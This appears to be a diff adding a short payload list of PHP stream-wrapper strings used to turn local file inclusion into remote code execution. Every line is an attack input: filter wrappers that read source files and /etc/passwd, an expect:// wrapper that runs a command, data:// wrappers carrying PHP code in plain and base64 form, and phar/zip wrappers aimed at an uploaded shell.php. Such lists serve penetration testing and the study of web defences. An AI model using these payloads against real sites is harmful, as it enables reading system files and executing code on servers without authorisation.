@@ -1,0 +1,12 @@
+# lfi/php-wrappers — PHP stream wrappers for LFI -> RCE pivots
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
+php://input
+php://memory
+php://temp
+expect://id
+data://text/plain,<?php phpinfo();?>
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+phar://uploaded.phar
+zip://uploaded.zip%23shell.php
